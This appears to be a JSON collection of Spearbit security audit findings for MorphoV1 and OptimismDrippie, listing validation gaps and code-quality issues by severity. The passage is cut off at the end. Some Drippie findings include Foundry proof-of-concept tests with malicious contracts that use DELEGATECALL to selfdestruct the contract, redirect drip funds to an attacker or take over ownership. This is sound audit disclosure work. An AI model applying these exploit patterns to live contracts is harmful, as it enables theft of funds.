        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the withdraw function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert Note 1: Aave is NOT checking that the market isFrozen. This means that users can withdraw even if the market is active but frozen More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave borrow validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the borrow function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false (check done by Aave on the borrow operation), users could be able to borrow in P2P even if the borrow is paused on Aave (isFrozen == true) because Morpho would only call the aave.withdraw (where the frozen flag is not checked)  Morpho do not check if market is active (would borrowingEnabled == false if market is not active?)  Morpho do not check if market is frozen (would borrowingEnabled == false if market is not frozen?)  Morpho do not check that healthFactor > GenericLogic.HEALTH_FACTOR_LIQUIDATION_THRESHOLD  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave supply validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the supply function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false, users could be able to supply in P2P even if the supply is paused on Aave (isFrozen == true) because Morpho would only call the aave.repay (where the frozen flag is not checked)  Morpho is not checking if remainingToSupply.rayDiv( poolIndexes[_poolToken].poolSupplyIndex ) === 0. Trying to supply that amount to Aave would make the whole tx revert 19 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Morpho should avoid creating a new market when the underlying Aave market is frozen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of Aave MorphoGovernance.createMarket the function is only check- ing if the AToken is in active state. Morpho should also check if the AToken is not in a frozen state. When a market is frozen, many operations on the Aave side will be prevented (reverting the transaction).",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Compound liquidate validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. Note: Morpho liquidation does not directly call compound.liquidate but acts as a repay + withdraw operation. By reviewing both logic, we have noticed that there are some differences between the logic  Morpho does not check Compound seizeGuardianPaused because it is not implementing a \"real\" liquidate on compound, but it's emulating it as a \"repay\" + \"withdraw\".  Morpho should anyway monitor off-chain when the value of seizeGuardianPaused changes to true. Which are the scenarios for which Compound decides to block liquidations (across all cTokens)? When this happens, is Compound also pausing all the other operations?  [Open question] Should Morpho pause liquidations when the seizeGuardianPaused is true?  Morpho is not reverting if msg.sender === borrower  Morpho does not check if _amount > 0  Compound revert if amountToSeize > userCollateralBalance, Morpho does not revert and instead uses min(amountToSeize, userCollateralBalance) 20 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "repayLogic in Compound PositionsManagershould revert if toRepay is equal to zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of repayLogic is correctly reverting if _amount == 0 but is not reverting if toRepay == 0. The value inside toRepay is given by the min value between _getUserBorrowBalanceInOf(_- poolToken, _onBehalf) and _amount. If the _onBehalf user has zero debt, toRepay will be initialized with zero.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Compound supply validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound is handling ERC20 tokens that could have transfer fees, Morpho is not doing it right now, see\"ERC20 with transfer's fee are not handled by PositionManager\".  Morpho is not checking if the underlying Compound market has been paused for the supply action (see mintGuardianPaused[token]). This means that even if the Compound supply is paused, Morpho could allow users to supply in the P2P.  Morpho is not checking if the market on both Morpho and Compound has been deprecated. If the deprecation flag is intended to be true for a market that will be removed in the next future, probably Morpho should not allow users to provide collateral for such a market. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider creating a documentation that covers all the Morpho own flags, lending protocol's flags and how they interact/override each other",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Both Morpho and Aave/Compound have their own flags to check before allowing a user to interact with the protocols. Usually, Morpho has decided to follow the logic to map 1:1 the implementation of the underlying protocol validation. There are some examples also where Morpho has decided to override some of their own internal flags For example, in the Aave aave-v2/ExitPositionsManager.liquidateLogic even if a Morpho market has been flagged as \"deprecated\" (user can be liquidated without being insolvent) the liquidator would not be able to liquidate the user if the liquidation logic has been paused.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing natspec or typos in natspec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "- Updated the natspec updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRate- Stored()\"  Updated the natspec _updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRateStored()\"  Updated the natspec for event MarketCreated replacing \"_poolToken\" with \"_p2pIndexCursor\"",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Removed unused \"named\" return parameters from functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Some functions in the codebase are defining \"named\" functions parameter that are not used explicitly inside the code. This could lead to future changes to return wrong values if the \"explicit return\" statement is removed and the function returns the \"default\" values (based on the variable type) of the \"named\" parameter.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider merging the code of CompoundMath libraries and use only one",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current codebase uses libraries/CompoundMath.sol but there's already an existing solidity library with the same name inside the package @morpho-dao/morpho-utils For better code clarity, consider merging those two libraries and only importing the one from the external pack- age. Be aware that the current implementation inside the @morpho-dao/morpho-utils CompoundMath mul and div function uses low-level yul and should be tested, while the library used right now in the code use \"high level\" solidity. the",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider reverting the creation of a deprecated market in Compound",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Compound has a mechanism that allows the Governance to set a specific market as \"deprecated\". Once a market is deprecated, all the borrows can be liquidated without checking whether the user is solvent or not. Compound currently allows users to enter (to supply and borrow) a market. In the current version of MorphoGovernance.createMarket, Morpho governance is not checking whether a market is already deprecated on compound before entering it and creating a new Morpho-market. This would allow a Morpho user to possibly supply or borrow on a market that has been already deprecated by compound.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document HeapOrdering",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Morpho uses a non-standard Heap implementation for their Aave P2P matching engine. The im- plementation only correctly sorts _maxSortedUsers / 2 instead of the expected _maxSortedUsers. Once the _maxSortedUsers is reached, it halves the size of the heap, cutting the last level of leaves of the heap. This is done because a naive implementation that would insert new values at _maxSortedUsers (once the heap is full) and shift them up, then decrease the size to _maxSortedUsers - 1 again, would end up concentrating all new values on the same single path from the leaf to the root node. Cutting off the last level of nodes of the heap is a heuristic to remove low-value nodes (because of the heap property) while at the same time letting new values be shifted up from different leaf locations. In the end, the goal this tries to achieve is that more high-value nodes are stored in the heap and can be used for the matching engine.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider removing the Aave-v2 reward management logic if it is not used anymore",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "If the current aave-v2 reward program has ended and the Aave protocol is not re-introducing it anytime soon (if not at all) consider removing the code that currently is handling all the logic behind claiming rewards from the Aave lending pool for the supplied/borrow assets. Removing that code would make the codebase cleaner, reduce the attack surface and possibly revert in case some of the state variables are incorrectly miss configured (rewards management on Morpho is activated but Aave is not distributing rewards anymore).",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid shadowing state variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Shadowing state or global variables could lead to potential bugs if the developer does not treat them carefully. To avoid any possible problem, every local variable should avoid shadowing a state or global variable name.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational aave-"
        ]
    },
    {
        "title": "Governance setter functions do not check current state before updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "In MorphoGovernance.sol, many of the setter functions allow the state to be changed even if it is already set to the passed-in argument. For example, when calling setP2PDisabled, there are no checks to see if the _poolToken is already disabled, or does not allow unnecessary state changes.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Emit event for amount of dust used to cover withdrawals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Consider emitting an event that includes the amount of dust that was covered by the contract balance. A couple of ways this could be used:  Trigger an alert whenever it exceeds a certain threshold so you can inspect it, and pause if a bug is found or a threshold is exceeded.  Use this value as part of your overall balance accounting to verify everything adds up.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Break up long functions into smaller composable functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "A few functions are 100+ lines of code which makes it more challenging to initially grasp what the function is doing. You should consider breaking these up into smaller functions which would make it easier to grasp the logic of the function, while also enabling you to easily unit test the smaller functions.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused struct members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The HealthFactorVars struct contains three attributes, but only the userMarkets attribute is ever set or used. These should be removed to increase code readability.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "There is an unused struct BorrowAllowedVars. This should be removed to improve code readability.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "No validation check on prices fetched from the oracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Currently in the liquidateLogic function when fetching the borrowedTokenPrice and collateral- Price from the oracle, the return value is not validated. This is due to the fact that the underlying protocol does not do this check either, but the fact that the underlying protocol does not do validation should not deter Morpho from performing validation checks on prices fetched from oracles. Also, this check is done in the Compound PositionsManager.sol here so for code consistency, it should also be done in Aave-v2.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "onBehalf argument can be set as the Morpho protocols address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When calling the supplyLogic function, currently the _onBehalf argument allows a user to supply funds on behalf of the Morpho protocol itself. While this does not seem exploitable, it can still be a cause for user error and should not be allowed.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "maxSortedUsers has no upper bounds validation and is not the same in Compound/Aave-2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "In MorphoGovernance.sol, the maxSortedUsers function has no upper bounds limit put in place. The maxSortedUsers is the number of users to sort in the data structure. Also, while this function has the MaxSorte- dUsersCannotBeZero() check in Aave-v2, the Compound version is missing this same error check.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding the compound revert error code inside Morpho custom error to better track the revert reason",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "On Compound, when an error condition occurs, usually (except in extreme cases) the transaction is not reverted, and instead an error code (code !== 0) is returned. Morpho correctly reverts with a custom error when this happens, but is not reporting the error code returned by Compound. By tracking, as an event parameter, the error code, Morpho could better monitor when and why interactions with Compound are failing.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "liquidationThreshold variable name can be misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The liquidationThreshold name in Aave is a percentage. The values.liquidationThreshold variable used in Morpho's _getUserHealthFactor is in \"value units\" like debt: values.liquidationThreshold = assetCollateralValue.percentMul(assetData.liquidationThreshold);.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users can be liquidated on Morpho at any time when the deprecation flag is set by governance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Governance can set a deprecation flag on Compound and Aave markets, and users on this mar- ket can be liquidated by anyone even if they're sufficiently over-collateralized. Note that this deprecation flag is independent of Compound's own deprecation flags and can be applied to any market.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Refactor _computeP2PIndexes to use InterestRateModel's functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The InterestRatesManager contracts' _computeP2PIndexes functions currently reimplement the interest rate model from the InterestRatesModel functions.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Permitting Multiple Drip Calls Per Block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "state.config.interval is 0. We are currently unaware of use cases where this is desirable. The inline comments correctly note that reentrancy is possible and permitted when Reentrancy is one risk, flashbot bundles are a similar risk where the drip may be called multiple times by the same actor in a single block. A malicious actor may abuse this ability, especially if interval is misconfigured as 0 due to JavaScript type coercion. A reentrant call or flashbot bundle may be used to frontrun an owner attempting to archive a drip or attempting to withdraw assets.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Version Bump to Latest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "During the review, a new version of solidity was released with an important bugfix.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DOS from External Calls in Drippie.executable / Drippie.drip",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "In both the executable and drip (which also calls executable) functions, the Drippie contract interacts with some external contract via low-level calls. The external call could revert or fail with an Out of Gas exception causing the entire drip to fail. The severity is low beacuse in the case where a drip reverts due to a misconfigured or malicious dripcheck or target, the drip can still be archived and a new one can be created by the owner.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use call.value over transfer in withdrawETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "transfer is no longer recommended as a default due to unpredictable gas cost changes in future evm hard forks (see here for more background.) While useful to use transfer in some cases (such as sending to EOA or contract which does not process data in the fallback or receiver functions), this particular contract does not benefit: withdrawETH is already owner gated and is not at risk of reentrancy as owner already has permission to drain the contracts ether in a single call should they choose.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Input Validation Checks for Drippie.create",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Drippie.create does not validate input potentially leading to unintended results. The function should check:  _name is not an empty string to avoid creating drip that would be able to read on frontend UI.  _config.dripcheck should not be address(0) otherwise executable will always revert.  _config.actions.length should be at least one (_config.actions.length > 0) to prevent creating drips that do nothing when executed.  DripAction.target should not be address(0) to prevent burning ETH or interacting with the zero address during drips execution.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ownership Initialization and Transfer Safety on Owned.setOwner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarios.  Scenario 1 Drippie allows the owner to be both initialized and set to address(0). If this scenario happens nobody will be able to manage the Drippie contract, thus preventing any of the following operations:  Creating a new drip  Updating a drips status (pausing, activating or archiving a drip) If set to the zero address, all the onlyOwner operations in AssetReceiver and Transactor will be uncallable. This scenario where the owner can be set to address(0) can occur when address(0) is passed to the construc- tor or setOwner.  Scenario 2 owner may be set to address(this). Given the static nature of DripAction.target and DripAction.data there is no benefit of setting owner to address(this), and all instances can be assumed to have been done so in error.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unchecked Return and Handling of Non-standard Tokens in AssetReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The current AssetReceiver contract implement \"direct\" ETH and ERC20 token transfers, but does not cover edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers  adhere to ERC20 interface (i.e. no return value) An ERC20 token that does not revert on failure would cause the WithdrewERC20 event to emit even though no transfer took place. An ERC20 token that does not have a return value will revert even if the call would have otherwise been successful. Solmate libraries already used inside the project offer a utility library called SafeTransferLib.sol which covers such edge cases. Be aware of the developer comments in the natspec: /// @dev Use with caution! Some functions in this library knowingly create dirty bits at the destination of the free memory pointer. /// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AssetReceiver Allows Burning ETH, ERC20 and ERC721 Tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver contains functions that allow the owner of the contract to withdraw ETH, ERC20 and ERC721 tokens. Those functions allow specifying the receiver address of ETH, ERC20 and ERC721 tokens but they do not check that the receiver address is not address(0). By not doing so, those functions allow to:  Burn ETH if sent to address(0).  Burn ERC20 tokens if sent to address(0) and the ERC20 _asset allow tokens to be burned via transfer (For example, Solmates ERC20 allow that, OpenZeppelin instead will revert if the recipient is address(0)).  Burn ERC721 tokens if sent to address(0) and the ERC721 _asset allow tokens to be burned via trans- ferFrom (For example, both Solmate and OpenZeppelin implementations prevent to send the _id to the address(0) but you dont know if that is still true about custom ERC721 contract that does not use those libraries).",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AssetReceiver Not Implementing onERC721Received Callback Required by safeTransferFrom.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver contains the function withdrawERC721 that allow the owner to withdraw ERC721 tokens. As stated in the EIP-721, the safeTransferFrom (used by the sender to transfer ERC721 tokens to the AssetRe- ceiver) will revert if the target contract (AssetReceiver in this case) is not implementing onERC721Received and returning the expected value bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")).",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Emit Events",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Transactor contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both of those functions are executing delegatecall and call without emitting any events. Because of the general- purpose nature of these function, it would be considered a good security measure to emit events to track the functions usage. Those events could be then used to monitor and track usage by external monitoring services.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Check the Result of the Execution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both functions return the delegatecall and call result back to the caller without checking whether execution was successful or not. By not implementing such check, the transaction could fail silently. Another side effect is that the ETH sent along with the execution (both functions are payable) would remain in the Drippie contract and not transferred to the _target. Test example showcasing the issue: contract Useless { // A contract that have no functions // No fallback functions // Will not accept ETH (only from selfdestruct/coinbase) } function test_transactorCALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them 8 (success, ) = drippie.CALL{value: 1 ether}(address(useless), \"\", 100000, 1 ether); assertEq(success, false); vm.prank(deployer); // Perform a `call` to a not existing target's function (success, ) = drippie.CALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000, 1 ether); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! } function test_transactorDELEGATECALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `delegatecall` to a contract that cannot receive them (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), \"\", 100000); assertEq(success, false); vm.prank(deployer); // Perform a `delegatecall` to a not existing target's function (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Transactor.DELEGATECALL Data Overwrite and selfdestruct Risks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL function that allow the owner to execute a delegatecall toward a target address passing an arbitrary payload. Consider the following scenarios:  Scenario 1 A malicious target contract could selfdestruct the Transactor contract and as a consequence the contract that is inheriting from Transactor. Test example showcasing the issue: 9 contract SelfDestroyer { function destroy(address receiver) external { selfdestruct(payable(receiver)); } } function test_canOwnerSelftDestructDrippie() public { // Assert that Drippie exist assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); assertGt(getContractSize(address(drippie)), 0); // set it to active vm.prank(deployer); drippie.status(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); // fund the drippie with 1 ETH vm.deal(address(drippie), 1 ether); uint256 deployerBalanceBefore = deployer.balance; uint256 drippieBalanceBefore = address(drippie).balance; // deploy the destroyer SelfDestroyer selfDestroyer = new SelfDestroyer(); vm.prank(deployer); drippie.DELEGATECALL(address(selfDestroyer), abi.encodeWithSignature(\"destroy(address)\", deployer), gasleft()); ,! uint256 deployerBalanceAfter = deployer.balance; uint256 drippieBalanceAfter = address(drippie).balance; // assert that the deployer has received the balance that was present in Drippie assertEq(deployerBalanceAfter, deployerBalanceBefore + drippieBalanceBefore); assertEq(drippieBalanceAfter, 0); // Weird things happens with forge // Because we are in the same block the code of the contract is still > 0 so // Cannot use assertEq(getContractSize(address(drippie)), 0); // Known forge issue // 1) Forge resets storage var to 0 after self-destruct (before tx ends) 2654 -> https://github.com/foundry-rs/foundry/issues/2654 // 2) selfdestruct has no effect in test 1543 -> https://github.com/foundry-rs/foundry/issues/1543 assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); ,! }  Scenario 2 The delegatecall allows the owner to intentionally, or accidentally, overwrite the content of the drips mapping. By being able to modify the drips mapping, a malicious user would be able to execute a series of actions like: Changing drips status:  Activating an archived drip  Deleting a drip by changing the status to NONE (this allows the owner to override entirely the drip by calling again create)  Switching an active/paused drip to paused/active 10  etc.. Change drips interval:  Prevent a drip from being executed any more by setting interval to a very high value  Allow a drip to be executed more frequently by lowering the interval value  Enable reentrancy by setting interval to 0 Change drips actions:  Override an action to send drips contract balance to an arbitrary address  etc.. Test example showcasing the issue: contract ChangeDrip { address public owner; mapping(string => Drippie.DripState) public drips; function someInnocentFunction() external { drips[\"FUND_BRIDGE_WALLET\"].config.actions[0] = Drippie.DripAction({ target: payable(address(1024)), data: new bytes(0), value: 1 ether }); } } 11 function test_canDELEGATECALLAllowReplaceAction() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Create an action with name \"FUND_BRIDGE_WALLET\" that have the function // To fund a wallet vm.startPrank(deployer); string memory fundBridgeWalletName = \"FUND_BRIDGE_WALLET\"; Drippie.DripAction[] memory actions = new Drippie.DripAction[](1); // The first action will send Bob 1 ether actions[0] = Drippie.DripAction({ target: payable(address(alice)), data: new bytes(0), value: 1 ether ,! }); Drippie.DripConfig memory config = createConfig(100, IDripCheck(address(checkTrue)), new bytes(0), actions); drippie.create(fundBridgeWalletName, config); drippie.status(fundBridgeWalletName, Drippie.DripStatus.ACTIVE); vm.stopPrank(); // Deploy the malicius contract vm.prank(attacker); ChangeDrip changeDripContract = new ChangeDrip(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(changeDripContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Now the drip action should have changed, anyone can execute it and funds would be sent to // the attacker and not to the bridge wallet drippie.drip(fundBridgeWalletName); // Assert we have drained Drippie assertEq(attacker.balance, 1 ether); assertEq(address(drippie).balance, 9 ether); }  Scenario 3 Calling a malicious contract or accidentally calling a contract which does not account for Drippies storage layout can result in owner being overwritten. Test example showcasing the issue: contract GainOwnership { address public owner; function someInnocentFunction() external { owner = address(1024); } } 12 function test_canDELEGATECALLAllowOwnerLoseOwnership() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Deploy the malicius contract vm.prank(attacker); GainOwnership gainOwnershipContract = new GainOwnership(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(gainOwnershipContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Assert that the attacker has gained onwership assertEq(drippie.owner(), 